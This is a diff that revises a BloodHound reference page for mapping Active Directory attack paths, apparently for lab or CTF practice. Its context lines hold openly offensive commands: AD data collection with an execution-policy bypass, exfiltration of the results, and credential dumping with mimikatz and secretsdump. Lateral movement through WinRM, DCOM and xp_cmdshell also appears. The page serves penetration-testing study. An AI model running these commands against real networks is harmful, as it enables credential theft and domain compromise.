@@ -1,6 +1,13 @@
 ---
-title: "BloodHound — Complete Guide"
+title: "BloodHound: Full Reference"
+sidebarTitle: "BloodHound full reference"
+description: "Explore BloodHound collection, imports, graph navigation, Cypher queries, and permission-edge examples for CE and legacy editions."
+keywords: ["bloodhound", "neo4j", "sharphound", "community edition", "legacy", "cypher", "attack paths", "file ingest"]
 ---
+
+<Note>
+**Start your current Kali setup:** [BloodHound startup and CE import](/tools/bloodhound). The saved reference below includes older installation and UI examples. Current Kali packages use CE; match the collector to your application.
+</Note>
 
 > BloodHound maps Active Directory as a **graph**: *who can do what to whom*. You collect data with a "SharpHound" collector, import it, mark accounts you control as **Owned**, and ask "what's the shortest path from me to Domain Admin?" This guide covers **install (both versions)**, **collection (Windows + Linux + over a pivot)**, **how to drive the UI**, and — the core — **every edge type with the exact command to abuse it**.
 
@@ -53,7 +60,7 @@ bloodhound &                           # GUI: connect bolt://localhost:7687 with
 - Import: **drag the `.zip` onto the window**, or **Upload Data** (top‑right up‑arrow).
 - Legacy matches the classic `bloodhound-python` / `SharpHound.exe` output.
 
-> Which to use? CE if you can spare the Docker setup (better UI, newer edges). Legacy if you want one `apt install` and guaranteed match with the classic Python collector. **Pick the collector that matches the UI version.**
+> **Version correction:** current Kali `apt install bloodhound` installs CE, not Legacy. The older installation block above is preserved as historical context. Use the current startup guide for your installed package and a compatible collector.
 
 ---
 
@@ -63,12 +70,12 @@ bloodhound &                           # GUI: connect bolt://localhost:7687 with
 ```cmd
 :: .exe
 .\SharpHound.exe -c All --zipfilename loot
-:: stealthier / specific:
+:: alternate collection example (not a guarantee of reduced logging):
 .\SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\Temp
 :: PowerShell version
 powershell -ep bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip"
 ```
-Collection methods: `Default`, `All`, `Session` (logged‑in users — re‑run periodically), `LoggedOn`, `ACL`, `DCOnly` (LDAP‑only, no host touch — quiet), `GPOLocalGroup`. Then exfil the zip ([Pivoting cheatsheet] `download`).
+Collection methods: `Default`, `All`, `Session` (logged‑in users — re‑run periodically), `LoggedOn`, `ACL`, `DCOnly` (directory-focused collection; check the collector version and selected methods), `GPOLocalGroup`. Then exfil the zip ([Pivoting cheatsheet] `download`).
 
 ### B. bloodhound-python (from Linux/Kali — remote)
 ```bash
@@ -85,7 +92,7 @@ Flags: `-ns` = DNS server (point at the DC), `-d` domain, `-c All`, `--zip`, `--
 # SOCKS proxy must be up; DNS must reach the DC -> use --dns-tcp
 proxychains bloodhound-python -u bdavid -p '...' -d nexura.htb -ns 172.16.119.11 -c All --zip --dns-tcp
 ```
-> Common failures over a pivot: **DNS** (add `--dns-tcp`, set `-ns <DC>`), and **timeouts** (the `-c All` Session/LoggedOn collection hits every host; use `-c DCOnly` if hosts are slow/filtered). If `-c All` hangs, `-c DCOnly` still gives you all ACL/group/trust data — enough for most paths.
+> Common failures over a pivot: **DNS** (add `--dns-tcp`, set `-ns <DC>`), and **timeouts** (host-derived collection can contact member computers; use `-c DCOnly` if hosts are slow/filtered). If `-c All` hangs, `-c DCOnly` still gives you all ACL/group/trust data — enough for most paths.
 
 ---
 
@@ -144,8 +151,10 @@ proxychains bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get object <t
 | **CanRDP** | You may RDP to that host | `xfreerdp3 /v:<host> /u:u /p:'p'` (port‑forward/ligolo) |
 | **CanPSRemote** | WinRM allowed | `evil-winrm -i <host> -u u -p p` |
 | **ExecuteDCOM** | DCOM lateral exec | `impacket-dcomexec` / Invoke‑DCOM |
-| **HasSession** | That user has a session on a box you control → their creds are in LSASS | get SYSTEM there → `sekurlsa::logonpasswords` |
+| **HasSession** | A session was observed; reusable credentials may or may not still be present | get SYSTEM there → `sekurlsa::logonpasswords` |
 | **SQLAdmin** | You're sysadmin on MSSQL | `mssqlclient -windows-auth`; `xp_cmdshell` / `enable_xp_cmdshell` |
+
+Session data is a collection-time observation, not proof that credentials remain available. Check freshness and prerequisites before treating an edge as a usable path. [SpecterOps: HasSession](https://bloodhound.specterops.io/resources/edges/has-session).
 
 ### ACL / object‑control edges (the escalation bread‑and‑butter)
 | Edge | What it grants | Abuse command |
@@ -215,7 +224,7 @@ proxychains impacket-secretsdump '<domain>/<you>:<pass>'@<DC> -just-dc-user Admi
 | `docker compose` unknown flag | compose plugin missing | `apt install docker-compose`; use `docker-compose -f ...` |
 | compose file "not found" | filename typo (`bh.compose.yml` vs `bh-compose.yml`) | match the exact name `curl -o` saved |
 | Collection over pivot very slow/hangs | `-c All` touches every host | use `-c DCOnly` (still gives ACLs/groups/trusts) |
-| Kerberos collection fails | clock skew | sync to the DC (`ntpdate`/`date -u`), then `-k` |
+| Kerberos collection fails | clock skew | compare with the DC’s current time and synchronize the lab clock; `date -u` only displays local UTC time |
 | Everything "owned" path empty | didn't mark accounts Owned | right‑click → Mark as Owned, re‑run "from Owned" |
 
 ---
